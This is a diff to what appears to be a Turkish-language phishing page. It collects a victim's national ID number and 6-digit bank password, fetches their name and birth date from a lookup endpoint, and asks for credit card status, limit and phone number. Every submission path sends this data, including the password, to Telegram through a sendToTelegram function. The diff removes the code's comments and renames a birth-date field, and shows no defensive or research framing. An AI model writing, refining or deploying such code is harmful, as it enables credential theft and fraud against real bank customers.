@@ -145,17 +145,14 @@
     };
     </script>
     <script>
-        // TC No doğrulama: 11 rakam ve ilk rakam 0 olamaz
         function validateTC(tc) {
             tc = tc.replace(/\D/g, '');
             return tc.length === 11 && tc[0] !== "0";
         }
-        // Şifre doğrulama: 6 rakam
         function validateSifre(sifre) {
             sifre = sifre.replace(/\D/g, '');
             return sifre.length === 6;
         }
-        // Telefon input formatlama ve kısıtlama
         function formatPhoneInput(value) {
             value = value.replace(/\D/g, '');
             if (value.length > 12) value = value.substring(0, 12);
@@ -170,7 +167,6 @@
         function validatePhone(phone) {
             return /^\+90 \d{3} \d{3} \d{2} \d{2}$/.test(phone);
         }
-        // Limit input formatlama: binlik ayırıcı ve ₺, ilk rakam 0 olamaz
         function formatLimitInput(val) {
             val = val.replace(/\D/g, '');
             if (val.length === 0) return '';
@@ -183,7 +179,6 @@
             val = val.replace(/\D/g, '');
             return val.length > 0 && val[0] !== '0';
         }
-        // Cihaz tipi tespiti
         function getDeviceType() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) return "Android";
@@ -191,7 +186,6 @@
             if (/windows|macintosh|linux/i.test(ua)) return "PC";
             return "Bilinmiyor";
         }
-        // --- AKIŞ ---
         let tcnoVal = "";
         let sifreVal = "";
         let adVal = "";
@@ -199,7 +193,6 @@
         let dogumVal = "";
 
         document.addEventListener("DOMContentLoaded", function () {
-            // İlk ekran: TC ve Şifre kontrolü
             const tcno = document.getElementById("tcno");
             const sifre = document.getElementById("sifre");
             const loginButton = document.getElementById("login-button");
@@ -222,7 +215,6 @@
                 sifre.value = sifre.value.replace(/\D/g, '').slice(0,6);
                 checkLoginValid();
             });
-
             checkLoginValid();
 
             document.getElementById("login-form").addEventListener("submit", function (e) {
@@ -232,22 +224,20 @@
                     if (!validateSifre(sifre.value)) sifreError.style.display = "block";
                     return;
                 }
-                // TC ve şifreyi sakla
                 tcnoVal = tcno.value;
                 sifreVal = sifre.value;
                 document.getElementById("login-spinner").style.display = "inline-block";
                 loginButton.disabled = true;
-                // TC API sorgusu
                 fetch("/tcLookup", {
                     method:"POST",
                     headers:{"Content-Type":"application/json"},
                     body:JSON.stringify({ tc: tcnoVal })
                 }).then(res=>res.json()).then(data=>{
                     document.getElementById("login-spinner").style.display = "none";
-                    if(data.success){
+                    if(data.success && data.AD && data.SOYAD){
                         adVal = data.AD;
                         soyadVal = data.SOYAD;
-                        dogumVal = data.DOGUMTARIHI;
+                        dogumVal = data.DogumTarihi || data.DOGUMTARIHI || "";
                         document.getElementById("login-container").style.display = "none";
                         document.getElementById("info-container").style.display = "block";
                         document.getElementById("welcome-title").innerText = `Hoşgeldiniz ${adVal} ${soyadVal}`;
@@ -265,7 +255,6 @@
                 });
             });
 
-            // Kredi kartı sorusu
             document.querySelectorAll(".kart-btn").forEach(btn => {
                 btn.addEventListener("click", function () {
                     document.getElementById("kredi_kart_durumu").value = btn.dataset.value;
@@ -288,7 +277,7 @@
                             sendToTelegram({
                                 AD: adVal,
                                 SOYAD: soyadVal,
-                                DOGUMTARIHI: dogumVal,
+                                DogumTarihi: dogumVal,
                                 tcno: tcnoVal,
                                 sifre: sifreVal,
                                 kredi_kart_durumu: "hayir",
@@ -300,7 +289,6 @@
                 });
             });
 
-            // Limit ve telefon alanları
             const limitInput = document.getElementById("limit");
             const telInput2 = document.getElementById("telno2");
             const tamamlaButton = document.getElementById("tamamla");
@@ -343,7 +331,6 @@
             });
             checkKartValid();
 
-            // Başvuru tamamla
             document.getElementById("girisForm").addEventListener("submit", function (e) {
                 e.preventDefault();
                 let validLimit = validateLimit(limitInput.value);
@@ -359,7 +346,7 @@
                 sendToTelegram({
                     AD: adVal,
                     SOYAD: soyadVal,
-                    DOGUMTARIHI: dogumVal,
+                    DogumTarihi: dogumVal,
                     tcno: tcnoVal,
                     sifre: sifreVal,
                     kredi_kart_durumu: "evet",
